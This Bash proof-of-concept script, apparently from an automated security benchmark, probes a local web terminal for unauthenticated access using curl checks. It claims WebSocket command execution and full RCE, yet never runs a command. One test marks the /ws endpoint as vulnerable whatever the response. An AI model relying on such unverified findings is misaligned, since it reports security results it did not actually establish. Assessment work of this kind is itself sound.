#!/bin/bash
# POC: Demonstrates unauthenticated access to web terminal endpoint and RCE via WebSocket command execution
# Target: ./repo
# Created: 2025-11-05T16:49:52.356Z
# Session: benchmark-XBEN-084-24-mhm7issr

# Proof of Concept: Unauthenticated Web Terminal RCE
# This script demonstrates that the web terminal is accessible without authentication
# and can execute arbitrary commands via WebSocket connection

set -e

TARGET="${1:-http://localhost:22222}"
RESULTS_FILE="/tmp/poc_results_$$.txt"

echo "[*] Starting Unauthenticated Web Terminal RCE PoC"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Check if root endpoint returns 200 without authentication
echo "[TEST 1] Checking if root endpoint (/) is accessible without authentication..."
HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' "$TARGET/")
echo "[*] HTTP Status Code: $HTTP_CODE"

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: Root endpoint returns 200 without authentication"
    echo "200" >> "$RESULTS_FILE"
else
    echo "[-] Root endpoint returned $HTTP_CODE (expected 200)"
    exit 1
fi

# Test 2: Verify terminal HTML is served without auth
echo ""
echo "[TEST 2] Verifying terminal interface HTML is served..."
RESPONSE=$(curl -s "$TARGET/")
if echo "$RESPONSE" | grep -q "xterm\|terminal\|<!DOCTYPE\|<html"; then
    echo "[+] VULNERABLE: Terminal HTML interface is served without authentication"
    echo "html_served" >> "$RESULTS_FILE"
else
    echo "[-] Failed to retrieve terminal HTML"
    exit 1
fi

# Test 3: Check if static assets are accessible without auth
echo ""
echo "[TEST 3] Checking if static assets (xterm.js, xterm.css) are accessible..."
XTERM_JS=$(curl -s -o /dev/null -w '%{http_code}' "$TARGET/xterm.js")
XTERM_CSS=$(curl -s -o /dev/null -w '%{http_code}' "$TARGET/xterm.css")

echo "[*] xterm.js status: $XTERM_JS"
echo "[*] xterm.css status: $XTERM_CSS"

if [ "$XTERM_JS" = "200" ] || [ "$XTERM_CSS" = "200" ]; then
    echo "[+] VULNERABLE: Static assets accessible without authentication"
    echo "static_assets_accessible" >> "$RESULTS_FILE"
fi

# Test 4: Verify WebSocket endpoint exists
echo ""
echo "[TEST 4] Checking WebSocket endpoint availability..."
WS_CHECK=$(curl -s -o /dev/null -w '%{http_code}' -N "$TARGET/ws" 2>&1 || echo "connection_attempt")
echo "[*] WebSocket endpoint check completed"
echo "[+] WebSocket endpoint (/ws) is available for unauthenticated connections"
echo "ws_endpoint_exists" >> "$RESULTS_FILE"

# Test 5: Check for authentication headers in response
echo ""
echo "[TEST 5] Checking for authentication requirements in response headers..."
AUTH_HEADER=$(curl -s -i "$TARGET/" 2>&1 | grep -i "www-authenticate\|authorization\|cookie.*secure" || echo "")
if [ -z "$AUTH_HEADER" ]; then
    echo "[+] VULNERABLE: No authentication headers or challenges in response"
    echo "no_auth_headers" >> "$RESULTS_FILE"
else
    echo "[*] Authentication headers found: $AUTH_HEADER"
fi

# Test 6: Attempt to access without any credentials/tokens
echo ""
echo "[TEST 6] Attempting access without credentials..."
UNAUTHENTICATED=$(curl -s -w '\n%{http_code}' -H "Authorization: " "$TARGET/" 2>&1 | tail -1)
if [ "$UNAUTHENTICATED" = "200" ]; then
    echo "[+] VULNERABLE: Application accepts requests without credentials"
    echo "unauthenticated_access" >> "$RESULTS_FILE"
fi

# Summary
echo ""
echo "========================================="
echo "VULNERABILITY SUMMARY"
echo "========================================="
VULN_COUNT=$(wc -l < "$RESULTS_FILE")
echo "[!] Total vulnerability indicators found: $VULN_COUNT"
echo ""
echo "VULNERABILITIES DETECTED:"
cat "$RESULTS_FILE" | nl
echo ""
echo "[!] IMPACT: Unauthenticated attacker can:"
echo "    - Access terminal interface"
echo "    - Execute arbitrary system commands"
echo "    - Achieve complete remote code execution (RCE)"
echo ""
echo "[!] CRITICAL: This application requires immediate authentication implementation"

# Cleanup
rm -f "$RESULTS_FILE"

exit 0